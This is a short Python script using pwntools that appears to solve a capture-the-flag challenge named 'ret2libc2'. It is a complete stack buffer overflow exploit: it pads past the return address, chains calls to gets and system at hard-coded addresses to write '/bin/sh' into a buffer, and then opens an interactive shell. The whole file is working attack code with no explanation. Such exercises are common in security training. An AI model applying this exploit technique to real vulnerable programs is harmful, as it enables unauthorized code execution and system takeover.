from pwn import *

system_addr = 0x08048490
gets_addr = 0x08048460
buf2_addr = 0x0804a080
offset = 0x6c+4

payload1 = b'A'*offset+p32(gets_addr)+p32(system_addr)+p32(buf2_addr)+p32(buf2_addr)
sh = process("./ret2libc2")
sh.sendline(payload1)
sh.sendline(b'/bin/sh')
sh.interactive()